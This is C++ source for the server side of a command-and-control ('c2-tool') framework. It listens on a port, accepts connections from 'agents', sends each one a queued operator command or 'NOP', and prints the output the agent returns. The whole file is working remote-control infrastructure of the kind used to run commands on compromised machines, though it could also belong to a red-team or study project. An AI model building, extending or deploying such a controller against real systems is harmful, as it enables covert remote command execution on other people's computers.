#include <cerrno>
#include <iostream>
#include <string>
#include <mutex>
#include <queue>
#include <thread>
#include <chrono>
#include <atomic>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <unordered_set>
#include "utils.h"
#include "server.h"

using namespace std;

ServerState server;

// this sets up a listening socket
int server_setup(int port)
{
    int listenfd = socket(AF_INET, SOCK_STREAM, 0);

    if (listenfd == -1)
    {
        cout << "\nSocket creation failed." << endl;
        return -1;
    }

    // in case server crashes -- freeing up the socket
    int opt = 1;
    setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(port);
    socklen_t len = sizeof(serverAddr);

    int bnd = bind(listenfd, reinterpret_cast<sockaddr*>(&serverAddr), len);

    if (bnd == -1)
    {
        cout << "\nIssue Binding. Port in Use?" << endl;
        close(listenfd);
        return -1;
    }

    int lst = listen(listenfd, 3);

    if (lst == -1)
    {
        cout << "\n[server] Issue Establishing Listener." << endl;
        close(listenfd);
        return -1;
    }

    cout << "[server] listening on " << port << endl;

    return listenfd;
}

// this handles the connections we receive from any agents
int connection_handler(int fd, atomic<bool>& running)
{
    sockaddr_in clientAddr;
    socklen_t len = sizeof(clientAddr);

    // this enables us to timeout if no agent connects after a while. without this, exiting (via operator shell)
    // won't work because accept() will keep blocking, so it won't check if running has turned false
    timeval timer{};
    timer.tv_sec = 10;
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &timer, sizeof(timer));

    while (running)
    {   
        string cmd{};
        string output{};
        bool isNewIP = false;
        char ipStr[INET_ADDRSTRLEN]; // to capture the connected agent's IP

        int connfd = accept(fd, reinterpret_cast<sockaddr*>(&clientAddr), &len);
        
        if (connfd == -1)
        {
            if (errno == EWOULDBLOCK || errno == EAGAIN)
            {
                if (!running) continue;

                else
                {
                    cout << "\n[server] Connection Timeout. Trying Again." << endl;
                    cout << "\r" << "\n[c2-tool] > " << flush;
                    continue;
                }
            }

            else
            {
                cout << "\n[server] Connection Error. Trying Again." << endl;
                this_thread::sleep_for(chrono::seconds(2));
                continue;
            }
        }

        // filling out the connected agent's IP accordingly
        inet_ntop(AF_INET, &clientAddr.sin_addr, ipStr, INET_ADDRSTRLEN);

        {
            lock_guard<mutex> guard(server.deadlock);
            if (server.seenIPs.find(ipStr) == server.seenIPs.end())
            {
                isNewIP = true;
                server.seenIPs.insert(ipStr);
            }
        }

        if (isNewIP)
        {
            cout << "\n[server] New Connection From: " << ipStr << endl;
        }
        
        {
            lock_guard<mutex> guard(server.deadlock);
            if (!server.commands.empty())
            {
                cmd = server.commands.front();
                server.commands.pop();
            }
        }

        // sending out active command
        if (!cmd.empty())
        {
            send_all(connfd, cmd);
        }
        // we should send some signal when no commands are available. otherwise, both sides will hit a deadlock
        else
        {
            send_all(connfd, "NOP");
        }

        // receiving any command output
        output = recv_all(connfd);

        if (output.empty())
        {
            cout << "\n[server] Empty String." << endl; // possible error
            close(connfd);
            continue;
        }
        else
        {
            cout << "\r" << output << "\n" << flush;
            cout << "[c2-tool] > " << flush; // we reconstruct our prompt after each output for cleaner formatting
            close(connfd);
        }
    }

    return 0;
}